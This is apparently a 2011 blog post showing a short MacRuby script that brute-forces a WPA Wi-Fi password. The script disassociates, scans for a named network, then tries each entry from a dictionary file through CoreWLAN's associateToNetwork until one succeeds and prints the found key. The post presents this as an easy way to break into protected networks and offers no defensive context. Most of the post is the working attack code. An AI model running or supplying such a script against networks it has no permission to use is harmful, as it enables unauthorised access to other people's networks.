title: Cracking WPA networks with MacRuby
created_at: 2011-12-14
----

With the release of Mac OSX 10.7 a new method was made available trough the `CoreWLAN` framework, allowing you to associate to networks with the specified passphrase. It's called `associateToNetwork`.

The point is that there's a lot of hype about WPA/WPA2 cracking lately, involving statistical calculation, multi-threaded and cloud-based bruteforce attacks just to conclude in how easy is to break into protected networks using a stupid dictionary attack like the following:

~~~ ruby
framework "CoreWLAN"

iface = CWInterface.interface
iface.disassociate

wlans = iface.scanForNetworksWithParameters(nil, error: nil)
wlan = wlans.find {|w| w.ssid == "WLAN_724A"}
p [wlan.bssid, wlan.ssid, wlan.securityMode, wlan.wlanChannel.channelNumber]

keys = File.read("./dictionary.txt").lines.to_a.reverse

keys.each_with_index do |key, index|
  key.chop!
  puts "CURRENT KEY: #{key} (#{index+1}/#{keys.size})"
  if iface.associateToNetwork(wlan, password: key, error: nil)
    puts "KEY FOUND: #{key}"
    exit
  end
end
~~~

And here are the results after barely 3 minutes of execution:

![File and Folder Scanner](/images/wpa-bruteforce.png)

Cool, uh?